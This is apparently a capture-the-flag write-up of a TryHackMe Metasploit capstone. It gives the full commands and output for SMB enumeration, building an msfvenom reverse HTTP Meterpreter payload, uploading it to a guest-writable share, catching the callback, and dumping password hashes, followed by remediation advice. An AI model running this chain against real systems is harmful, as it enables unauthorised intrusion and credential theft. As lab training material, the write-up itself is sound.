# Capstone Challenge
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Metasploit and Exploitation* | **Room:** *Metasploit: Payload Generation* | **Task:** *[Capstone Challenge](https://tryhackme.com/room/metasploitpayloadgeneration)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
> 
> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.

---

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](http://www.tryhackme.com) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

The objective of this capstone was to apply the techniques covered throughout the Metasploit module. The exercise required the creation of a custom Windows Meterpreter payload, delivery through a guest-writable SMB share, configuration of a matching Metasploit handler and post-exploitation of the resulting session.

The target permitted outbound HTTP and HTTPS traffic. A stageless HTTP Meterpreter payload was therefore used to establish a reliable reverse connection through an allowed protocol.

Final compromise chain:

    SMB enumeration
    → guest-writable public share
    → stageless Meterpreter payload upload
    → scheduled execution
    → Meterpreter session
    → local password hash extraction
    → flag retrieval

Confirmed lab details used during the demonstration:

    Target IP: <TARGET_IP>
    Kali tun0 IP: <TUN0_IP>
    Attacker working directory: /tmp/VK

## Tools Used

The main tools used were:

- `nmap` for TCP port scanning, service detection and default NSE scripts.
- `smbclient` for anonymous SMB share enumeration.
- `msfvenom` for generating the Windows Meterpreter executable.
- `msfconsole` for SMB file upload, handler configuration and session management.
- `Meterpreter` for post-exploitation, password hash extraction and file-system searching.

Click [HERE](https://github.com/Valikahn/TryHackMe-Writeups#tools-commonly-used) to return to the repository README. Section `Tools Commonly Used` has all the links used and will be updated peredically with new tools if used or if links needs become 404.

## Initial Enumeration

The first step was to identify the services exposed by the target.

From the Kali Linux terminal:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

The options used were:

- `-sC` to run the default Nmap scripts.
- `-sV` to perform service and version detection.
- `-p-` to scan all 65,535 TCP ports.

The important findings were:

```text
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  http
47001/tcp open  http
```

Several additional dynamic RPC ports were also exposed.

The scan identified a Windows host named `CAPSTONE`. Port `445/tcp` confirmed that SMB was available, making it the most relevant service for the guest-writable share described by the room.

Nmap also reported that SMB signing was enabled but not required:

```text
smb2-security-mode:
  3.1.1:
    Message signing enabled but not required
```

## SMB Share Enumeration

The available SMB shares were enumerated without supplying credentials:

```bash
smbclient -L //<TARGET_IP> -N
```

The `-N` option suppresses the password prompt and attempts an anonymous or guest session.

The target returned the following shares:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
internal        Disk      Internal files
IPC$            IPC       Remote IPC
public          Disk      Public uploads
```

The `public` share matched the scenario description and was identified as the likely guest-writable upload location.

The SMB1 workgroup lookup failed after the share listing:

```text
Unable to connect with SMB1 -- no workgroup available
```

This did not affect the enumeration result. The SMB2/SMB3 share listing had already completed successfully.

## Payload Selection

The room specified two important requirements:

1. The payload should be stageless for reliability.
2. The target only allowed outbound HTTP or HTTPS traffic.

A stageless 64-bit Windows Meterpreter payload using HTTP was selected:

```text
windows/x64/meterpreter_reverse_http
```

This differs from a staged payload such as:

```text
windows/x64/meterpreter/reverse_http
```

The underscore in `meterpreter_reverse_http` indicates the stageless form, where the complete Meterpreter payload is included in the generated executable.

## Generating the Meterpreter Payload

The payload was generated from the Kali working directory:

```bash
cd /tmp/VK
```

The following `msfvenom` command created the executable:

```bash
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<TUN0_IP> LPORT=80 -f exe -o payload.exe
```

The command options were:

- `-p windows/x64/meterpreter_reverse_http` selected the stageless 64-bit Windows Meterpreter payload.
- `LHOST=<TUN0_IP>` set the callback address to the Kali `tun0` interface.
- `LPORT=80` used an outbound HTTP-compatible port.
- `-f exe` generated a Windows executable.
- `-o payload.exe` saved the result as `payload.exe`.

Metasploit confirmed successful payload generation:

```text
No encoder specified, outputting raw payload
Payload size: 249948 bytes
Final size of exe file: 257024 bytes
Saved as: payload.exe
```

No encoder was required for this lab. Encoding does not inherently make a payload undetectable and should not be confused with antivirus evasion.

## Loading the SMB Upload Module

Metasploit Framework was started and the SMB upload utility was loaded:

```bash
msfconsole -q -x 'use auxiliary/admin/smb/upload_file'
```

The `-q` option starts Metasploit without the banner. The `-x` option executes the supplied console command after startup.

Metasploit displayed:

```text
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

The module can upload through an existing SMB session or connect directly to a remote host.

## Configuring the SMB Upload

The target and share were configured:

```text
set RHOSTS <TARGET_IP>
set SMBSHARE public
```

An initial attempt was made to use the option name `LOCALFILE`:

```text
set LOCALFILE /tmp/VK/payload.exe
```

Metasploit returned:

```text
[!] Unknown datastore option: LOCALFILE.
```

Rather than guessing, the module options were checked:

```text
show options
```

The relevant options were:

```text
LPATH    The path of the local file to utilise
RPATH    The name of the remote file relative to the share
SMBSHARE The name of a writable share on the server
RHOSTS   The target host
```

The correct file settings were then applied:

```text
set LPATH /tmp/VK/payload.exe
set RPATH payload.exe
```

This configured:

- `LPATH` as the local payload on Kali.
- `RPATH` as the name to use within the remote `public` share.

## Uploading the Payload

The module was executed:

```text
run
```

Metasploit confirmed that the executable had been uploaded:

```text
[+] <TARGET_IP>:445 - /tmp/VK/payload.exe uploaded to payload.exe
[*] <TARGET_IP>:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The lab scenario stated that a scheduled task monitored the writable share and processed uploaded executable files. This target-side automation was responsible for triggering the payload.

In a real assessment, scheduled execution should never be assumed without evidence. Here, it was an intentional part of the authorised TryHackMe scenario.

## Configuring the Metasploit Handler

The SMB upload module was replaced with Metasploit's generic payload handler:

```text
use exploit/multi/handler
```

The handler had to match the payload type and callback settings used by `msfvenom`:

```text
set PAYLOAD windows/x64/meterpreter_reverse_http
set LHOST <TUN0_IP>
set LPORT 80
```

The listener was started:

```text
run
```

Metasploit reported:

```text
[*] Started HTTP reverse handler on http://<TUN0_IP>:80
```

Matching the handler to the generated payload is essential. A staged handler cannot reliably handle a stageless payload when the payload types do not correspond.

## Receiving the Meterpreter Session

After the scheduled task executed the uploaded payload, the target connected to the HTTP handler.

Relevant output included:

```text
[*] http://<TUN0_IP>:80 handling request from <TARGET_IP>
[*] Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened
```

The session connected from the target to Kali:

```text
<TUN0_IP>:80 -> <TARGET_IP>:<ephemeral-port>
```

The prompt changed to:

```text
meterpreter >
```

This confirmed successful code execution and an active Meterpreter session on the Windows target.

Warnings relating to payload UUID tracking were also displayed because the Metasploit database was not connected:

```text
Without a database connected that payload UUID tracking will not work!
```

These warnings did not prevent the session from opening and were not relevant to completing the room.

## Dumping Local Password Hashes

From the Meterpreter prompt, the local Security Account Manager database was queried:

```text
hashdump
```

The output used the standard format:

```text
username:RID:LM-hash:NTLM-hash:::
```

Several local accounts were returned, including:

```text
Administrator
DefaultAccount
Guest
jim
WDAGUtilityAccount
```

The entry for `jim` followed this structure:

```text
jim:1008:<LM-HASH>:<NTLM-HASH>:::
```

The value required by the room is the fourth colon-separated field: the NTLM hash.

For spoiler control, the answer is not reproduced in this public write-up.

Answer:

```text
<REDACTED>
```

## Searching for the Flag

The room stated that the flag was located somewhere beneath:

```text
C:\Users\Administrator
```

Meterpreter's recursive search function was used:

```text
search -d C:\\Users\\Administrator -f flag*
```

The command options were:

- `-d` to specify the directory in which to search.
- `-f flag*` to match files beginning with `flag`.

Meterpreter returned one result:

```text
C:\Users\Administrator\Documents\flag.txt
```

The file was then read directly:

```text
cat C:\\Users\\Administrator\\Documents\\flag.txt
```

The flag was displayed in the standard TryHackMe format:

```text
THM{<REDACTED>}
```

The exact value has been intentionally omitted from this public write-up.

## Full Attack Chain Recap

### 1. Service discovery

A full TCP scan identified a Windows host with SMB exposed on port `445/tcp`.

### 2. Anonymous SMB enumeration

An anonymous `smbclient` listing revealed a `public` share described as `Public uploads`.

### 3. Payload generation

A stageless 64-bit Windows Meterpreter HTTP payload was generated with `msfvenom`. The callback used the Kali `tun0` IP address and TCP port `80`.

### 4. SMB payload delivery

Metasploit's `auxiliary/admin/smb/upload_file` module uploaded the executable to the guest-writable `public` share.

### 5. Handler configuration

The `exploit/multi/handler` module was configured with the exact same payload, listening address and port as the generated executable.

### 6. Scheduled execution

The target-side scheduled task processed the uploaded executable, causing it to connect back to the HTTP handler.

### 7. Meterpreter post-exploitation

The resulting Meterpreter session was used to dump local password hashes and identify the NTLM hash belonging to `jim`.

### 8. Flag discovery

Meterpreter recursively searched `C:\Users\Administrator`, located `Documents\flag.txt` and displayed its contents.

## Key Lessons

This capstone demonstrated several important Metasploit concepts:

- Payload and handler settings must match exactly.
- Staged and stageless payloads are different and use different Metasploit names.
- Payload transport should be selected according to the target's permitted outbound traffic.
- The callback address must be reachable from the target; in this lab, that was the Kali `tun0` IP address.
- Anonymous SMB access can expose writable shares and dangerous upload paths.
- `show options` should be used when a module rejects or does not recognise an option.
- Metasploit auxiliary modules can support delivery and administration tasks without using a separate exploit module.
- Meterpreter provides built-in post-exploitation commands for credential access and file-system searching.
- Database-related warnings do not necessarily indicate that a Meterpreter handler has failed.

A particularly useful troubleshooting lesson was the correction from the invalid `LOCALFILE` option to the module's actual `LPATH` and `RPATH` settings. Checking the loaded module's options is more reliable than relying on option names from older versions or unrelated modules.

## Remediation Notes

The weaknesses represented in this lab could be mitigated by:

- Disabling anonymous or guest access to SMB shares.
- Applying least-privilege permissions to shared directories.
- Preventing untrusted users from uploading executable content.
- Avoiding scheduled tasks that automatically execute files from writable locations.
- Separating upload directories from execution paths.
- Applying application allow-listing controls such as Windows Defender Application Control or AppLocker.
- Restricting outbound traffic to approved destinations rather than allowing unrestricted access based only on destination port.
- Monitoring SMB write activity and newly created executable files.
- Enabling and enforcing SMB signing where appropriate.
- Using endpoint detection and response controls to identify suspicious payload execution and Meterpreter behaviour.
- Protecting privileged Windows processes and the SAM database from unauthorised access.
- Reviewing service accounts and scheduled tasks for excessive privileges.

The primary design failure was not simply that a share was writable. The critical issue was that attacker-controlled executable content placed in that share was subsequently processed by a privileged automated task.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
